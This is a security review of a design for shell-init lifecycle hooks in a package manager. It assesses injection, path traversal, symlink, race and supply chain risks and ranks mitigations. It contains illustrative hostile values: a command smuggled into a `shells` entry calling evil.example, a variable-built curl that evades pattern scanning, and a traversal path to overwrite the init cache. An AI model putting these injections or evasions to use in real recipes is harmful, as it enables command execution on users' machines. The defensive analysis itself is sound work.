# Security Review of tool-lifecycle-hooks Design

## Scope

This review evaluates the design document's Security Considerations section and the phase 5 security research for completeness of attack vectors, sufficiency of mitigations, correctness of applicability assessments, and residual risk.

## 1. Attack Vectors Not Considered

### 1.1 Template injection via `{shell}` substitution

The `source_command` field uses `{shell}` as a substitution variable (e.g., `niwa shell-init {shell}`). The design doesn't specify how the shell list is determined or validated. If a user's shell name contains special characters or if the shell list is user-configurable, the substituted command could be injected. For example, if `shells` accepts arbitrary strings from a recipe, a recipe could specify `shells = ["bash; curl evil.example"]` to inject commands into the `source_command` template.

**Risk level:** Medium. The existing `ExpandVars` pattern in `run_command.go` does simple string substitution without shell escaping. If `install_shell_init` follows the same pattern and passes the result to `sh -c`, the `shells` array becomes an injection vector.

**Recommendation:** Validate `shells` entries against a hardcoded allowlist (`bash`, `zsh`, `fish`). Do not accept arbitrary shell names from recipes.

### 1.2 Path traversal in `source_file`

The `source_file` parameter takes "path relative to tool install dir." The design and security research both mention path traversal prevention but neither specifies the validation mechanism. A recipe with `source_file = "../../share/shell.d/.init-cache.bash"` could overwrite the cache file directly, bypassing content hashing.

**Risk level:** High. The cache file is the single concatenation point sourced in every shell. Direct overwrite via path traversal skips all validation layers.

**Recommendation:** Resolve `source_file` to an absolute path, then verify it starts with the tool's install directory prefix. Reject paths containing `..` components after resolution.

### 1.3 Symlink following in shell.d

Neither document discusses what happens if a shell.d file is replaced with a symlink between install and cache rebuild. An attacker (or a compromised tool binary via `source_command`) could create `share/shell.d/niwa.bash` as a symlink to `/etc/passwd` or any other file. The cache rebuild would then concatenate arbitrary file contents into the init cache.

**Risk level:** Medium. Requires local filesystem access or a compromised tool binary, but the cache rebuild has no symlink check.

**Recommendation:** During cache rebuild, verify each file in shell.d is a regular file (not a symlink). Use `os.Lstat` rather than `os.Stat` to detect symlinks.

### 1.4 Race condition in update flow

The update ordering is: (1) install new version with hooks, (2) compute stale cleanup, (3) execute stale cleanup, (4) delete old. Between steps 1 and 2, the new version's shell.d files exist alongside the old version's. If a concurrent `tsuku install` of a different tool triggers a cache rebuild during this window, both old and new shell.d files get concatenated. This is a correctness issue more than a security issue, but it could cause double-execution of init scripts with side effects.

**Risk level:** Low. Unlikely to be exploitable, but the file locking mitigation mentioned in the security research should cover this.

### 1.5 Denial of shell via malformed init script

A tool's init script could contain a syntax error (unmatched quote, infinite loop, `exit 0`) that breaks the user's shell startup. Since the cache file is sourced synchronously, a single bad script prevents shell initialization entirely. The user must then manually delete the cache file or the offending shell.d script to recover.

**Risk level:** Medium. Not a confidentiality/integrity issue, but an availability issue that could lock users out of new shell sessions. The design says "hooks fail gracefully, not fatally" but that applies to hook *execution during install*, not to the *sourced output* at shell startup.

**Recommendation:** Add basic syntax validation before writing to shell.d. For bash/zsh, `bash -n` (syntax check only) on the generated content catches unmatched quotes and parse errors. Document the recovery procedure (deleting `.init-cache.{shell}` restores shell access).

## 2. Mitigation Sufficiency

### 2.1 Content scanning (defense-in-depth): Insufficient as specified

Both the design and security research propose scanning `source_command` output for high-risk patterns (network commands, credential paths). This is a good defense-in-depth layer but has two gaps:

- **Evasion is trivial.** Shell allows arbitrary command construction via variables: `c="cu"; c="${c}rl"; $c https://evil.example`. Pattern matching on literal strings like `curl` is easy to bypass. The documents acknowledge this ("not a complete barrier") but don't discuss what the scan actually catches vs. what it doesn't.
- **False positives on legitimate tools.** Direnv's init script legitimately uses `eval` and modifies `cd`. Zoxide wraps `cd`. A naive scan for "shell built-in overrides" would flag both. The scanning rules need to be tuned per-action rather than blanket-applied, or the scan becomes a source of friction that gets disabled.

**Recommendation:** Keep the scan but set expectations: it catches accidental inclusion (e.g., a debug `curl` left in a release build), not deliberate attack. Document what the scan covers and what it doesn't. Consider making scan failures advisory (warning) rather than blocking for `source_file`, and blocking only for `source_command`.

### 2.2 Content hashing in state: Sufficient for post-install tampering, not for supply chain

Storing SHA-256 hashes of shell.d files in `VersionState` and verifying during cache rebuild detects filesystem tampering between install and sourcing. This is a solid mitigation for the TOCTOU and local tampering vectors.

However, it does nothing for supply chain attacks (the "most significant new risk" per the design). A compromised upstream binary generates malicious output, the hash of that output is stored faithfully, and verification passes. The hash just confirms that the malicious content hasn't been modified since install.

**Recommendation:** The documents already note this limitation. No change needed, but the design should avoid framing content hashing as a supply chain mitigation -- it's a tampering detection mechanism only.

### 2.3 `source_command` restriction to tool binary: Necessary but incomplete

Validating that `source_command` invokes the tool's own binary prevents recipes from running arbitrary commands. This is a good structural control. But the validation needs to be precise:

- The command template `niwa shell-init {shell}` has `niwa` as the first token. The validator must resolve this to `$TSUKU_HOME/tools/niwa-{version}/bin/niwa`, not to any `niwa` on PATH. If the validator checks PATH, a compromised tool earlier in PATH could intercept.
- What about subcommands with pipes? `niwa shell-init bash | head -20` -- the first token is still the tool binary, but the pipe introduces another command. The validator should reject pipes, redirects, and command separators in the template.

**Recommendation:** Validate that the command template, after `{shell}` substitution, contains no shell metacharacters (`|`, `;`, `&`, `>`, `<`, `` ` ``, `$(`, `{`). Resolve the first token to the tool's install directory. Do not use `sh -c` to execute `source_command` -- use `exec.Command` with explicit argument splitting.

### 2.4 File locking during cache rebuild: Necessary

The security research recommends file locking. The design doesn't include it in the Decision Outcome or Solution Architecture sections. Given that concurrent `tsuku install` processes are plausible (e.g., a user running `tsuku install a & tsuku install b`), this should be a required mitigation, not advisory.

**Recommendation:** Use `flock` on a lockfile in the shell.d directory during both shell.d file writes and cache rebuilds. Include this in the Solution Architecture, not just the security section.

## 3. "Not Applicable" Justification Review

The security research marks all four dimensions (External Artifact Handling, Permission Scope, Supply Chain Trust, Data Exposure) as applicable. This is correct. No dimensions were marked "not applicable."

However, two additional standard dimensions are implicitly absent:

### 3.1 Denial of Service

Not explicitly evaluated. A tool could generate an extremely large init script (megabytes of shell code) that makes shell startup unacceptably slow or causes memory exhaustion. The 5ms budget assumes "small (under 50 lines each)" scripts, but nothing enforces this.

**Recommendation:** Add a size limit on shell.d files (e.g., 64KB). Log a warning if a generated script exceeds a reasonable threshold. This is low severity but should be documented as a design constraint.

### 3.2 Privilege Escalation

Not directly applicable since tsuku runs as the current user. However, if a user has `tsuku` in a sudo-capable script or if `$TSUKU_HOME` is set to a shared location (e.g., `/opt/tsuku`), shell.d files written by one user could be sourced by another. The design assumes single-user `$TSUKU_HOME`, but doesn't state this explicitly.

**Recommendation:** Document that `$TSUKU_HOME` must be user-owned and not shared. During `install_shell_init`, verify the shell.d directory is owned by the current user and not world-writable.

## 4. Residual Risk Assessment

### 4.1 Residual risk that should be escalated: Supply chain via `source_command`

The design and security research both identify supply chain compromise via `source_command` as the highest risk. The proposed mitigations (binary restriction, content scanning, hashing) reduce the attack surface but do not close it. A legitimate tool's binary, compromised upstream, can generate malicious shell init output that passes all validations. This is inherent to `source_command` -- the only complete mitigation is not using it.

**Escalation recommendation:** The design's proposal to ship `source_file` first and gate `source_command` behind additional validation is sound. Consider making `source_command` an opt-in feature that requires explicit user consent at install time (e.g., `tsuku install --allow-shell-exec direnv`). This converts the invisible trust escalation into a visible user decision. If `source_command` ships ungated, document that tools using it carry fundamentally higher supply chain risk than `source_file` tools.

### 4.2 Residual risk that should be escalated: Cache as persistent backdoor

Once malicious content enters the init cache, it persists across shell sessions with no expiration. Unlike a compromised binary (which the user might notice via behavior changes), a shell init script operates invisibly. The content hashing mitigation detects external tampering but not compromise-at-source. There is no mechanism for users to be notified that a tool's init output changed after an update.

**Escalation recommendation:** On `tsuku update`, if the tool has `install_shell_init` and the generated output differs from the stored hash, display a diff and prompt the user to confirm. This is the single highest-value mitigation not yet in the design. It converts silent updates into visible changes.

### 4.3 Accepted residual risk (does not need escalation)

- **TOCTOU in shell.d directory:** Mitigated sufficiently by file locking + content hashing.
- **Alphabetical ordering allowing early interception:** Low likelihood and low impact given the trust level of recipes in the registry.
- **Shell.d scripts running with full user privileges:** Inherent to the feature. Mitigated by the declarative-first approach and opt-in for `source_command`.

## 5. Summary of Findings

| # | Finding | Severity | Status in Docs |
|---|---------|----------|----------------|
| 1 | `shells` array injection into `source_command` template | High | Not considered |
| 2 | Path traversal via `source_file` to overwrite cache | High | Mentioned but no mechanism specified |
| 3 | Symlink following during cache rebuild | Medium | Not considered |
| 4 | Shell syntax errors causing denial of shell | Medium | Not considered |
| 5 | Content scanning trivially evaded | Medium | Acknowledged but understated |
| 6 | `source_command` allows shell metacharacters (pipes, etc.) | High | Not considered |
| 7 | No size limit on generated shell.d files | Low | Not considered |
| 8 | No diff/prompt on init output change during update | High | Not in design |
| 9 | Supply chain via `source_command` not fully closable | Critical | Identified but residual risk not escalated |
| 10 | File locking not in Solution Architecture | Medium | In security research only |

## 6. Recommendations Priority

**Must address before implementation:**
1. Hardcode `shells` allowlist (bash, zsh, fish) -- prevents template injection
2. Validate `source_file` does not traverse outside install directory
3. Reject shell metacharacters in `source_command` template; do not use `sh -c`
4. Add file locking to Solution Architecture
5. Verify shell.d entries are regular files (not symlinks) during cache rebuild

**Should address before shipping `source_command`:**
6. Show diff of init output changes on `tsuku update` with user prompt
7. Add basic syntax validation (`bash -n`) before writing to shell.d
8. Make `source_command` opt-in or require explicit user consent

**Should document:**
9. Recovery procedure for broken shell startup (delete cache file)
10. `$TSUKU_HOME` must be user-owned, not shared
11. Content scanning catches accidents, not deliberate attacks
